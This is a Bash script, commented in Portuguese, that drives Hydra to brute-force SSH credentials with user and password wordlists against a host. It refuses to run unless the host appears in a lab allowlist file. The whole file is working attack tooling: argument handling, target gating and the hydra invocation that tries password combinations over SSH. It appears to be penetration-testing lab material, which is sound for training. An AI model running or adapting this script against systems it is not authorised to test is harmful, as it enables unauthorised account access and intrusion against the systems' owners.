#!/usr/bin/env bash
# Força bruta SSH com Hydra contra um alvo do laboratório (lista branca em lab/allowed_targets.txt).
set -uo pipefail

AQUI="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=allowlist.sh
source "$AQUI/allowlist.sh"

uso() {
  cat <<USO
Uso: bruteforce.sh <alvo> [--users ARQ] [--passwords ARQ] [--threads N] [--port P] [--stop-on-success]

  <alvo>            hostname do laboratório (deve constar em lab/allowed_targets.txt)
  --users ARQ       lista de usuários (padrão: wordlists/users.txt)
  --passwords ARQ   lista de senhas (padrão: wordlists/passwords.txt; aceita arquivo externo)
  --threads N       tarefas paralelas do Hydra (padrão: 16, máximo útil para SSH no Hydra)
  --port P          porta SSH do alvo (padrão: 2222)
  --stop-on-success para no primeiro par válido encontrado
  -h, --help        mostra esta ajuda

Códigos de saída: 0 sucesso, 1 uso incorreto, 2 alvo recusado, 3 hydra ausente.
USO
}

alvo=""
users="$AQUI/wordlists/users.txt"
passwords="$AQUI/wordlists/passwords.txt"
threads=16
port=2222
parar_no_sucesso=""

while [[ $# -gt 0 ]]; do
  case "$1" in
    -h | --help) uso; exit 0 ;;
    --users) users=${2:?"--users exige um arquivo"}; shift 2 ;;
    --passwords) passwords=${2:?"--passwords exige um arquivo"}; shift 2 ;;
    --threads) threads=${2:?"--threads exige um número"}; shift 2 ;;
    --port) port=${2:?"--port exige um número"}; shift 2 ;;
    --stop-on-success) parar_no_sucesso="-f"; shift ;;
    -*) echo "ERRO: opção desconhecida '$1'" >&2; uso >&2; exit 1 ;;
    *) [[ -z "$alvo" ]] || { echo "ERRO: alvo duplicado '$1'" >&2; exit 1; }; alvo=$1; shift ;;
  esac
done

[[ -n "$alvo" ]] || { echo "ERRO: informe o alvo" >&2; uso >&2; exit 1; }
[[ "$threads" =~ ^[0-9]+$ && "$port" =~ ^[0-9]+$ ]] || { echo "ERRO: --threads e --port devem ser numéricos" >&2; exit 1; }
require_allowed_target "$alvo"
for arq in "$users" "$passwords"; do
  [[ -r "$arq" ]] || { echo "ERRO: arquivo ilegível: $arq" >&2; exit 1; }
done

command -v hydra >/dev/null || { echo "ERRO: hydra não encontrado" >&2; exit 3; }

echo "Alvo permitido: $alvo:$port ($(wc -l <"$users") usuários x $(wc -l <"$passwords") senhas, $threads tarefas)"
# shellcheck disable=SC2086
hydra -L "$users" -P "$passwords" -t "$threads" -s "$port" $parar_no_sucesso "ssh://$alvo"
